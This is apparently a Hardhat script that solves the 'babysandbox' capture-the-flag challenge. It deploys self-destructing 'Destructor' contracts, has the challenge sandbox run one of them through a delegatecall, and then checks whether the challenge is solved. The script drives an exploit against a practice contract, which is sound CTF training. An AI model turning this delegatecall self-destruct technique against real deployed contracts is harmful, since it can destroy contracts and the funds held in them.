import { Contract } from 'ethers'
import { task } from 'hardhat/config'

task('babysandbox')
  .addOptionalPositionalParam('setupAddress')
  .setAction(async ({ setupAddress }, { run, ethers }) => {
    await run('compile')

    // get signer

    const signer = (await ethers.getSigners())[0]
    console.log('Signer', signer.address)

    // setup problem

    let setup: Contract
    if (setupAddress) {
      setup = await ethers.getContractAt(
        'contracts/babysandbox/Setup.sol:Setup',
        setupAddress,
      )
    } else {
      setup = await (
        await ethers.getContractFactory('contracts/babysandbox/Setup.sol:Setup')
      ).deploy()
    }
    console.log('Setup')
    console.log('  at', setup.address)

    const destructorOther = await (
      await ethers.getContractFactory(
        'contracts/babysandbox/Destructor.sol:Destructor',
      )
    ).deploy(setup.address)

    const destructor = await (
      await ethers.getContractFactory(
        'contracts/babysandbox/Destructor.sol:Destructor',
      )
    ).deploy(destructorOther.address)

    console.log('destructor')
    console.log('  at', destructor.address)
    console.log(
      'COPY THIS ADDRESS TO Destructor.sol and run this script again',
      await destructorOther.other(),
    )
    // You have to hard code this because it's a delegatecall

    // init contracts

    const sandbox = await ethers.getContractAt(
      'BabySandbox',
      await setup.sandbox(),
    )
    console.log('sandbox')
    console.log('  at', sandbox.address)

    // // perform exploit

    console.log(await sandbox.run(destructor.address))

    // await hello.solve()

    // verify

    console.log('Success?', await setup.isSolved())
  })
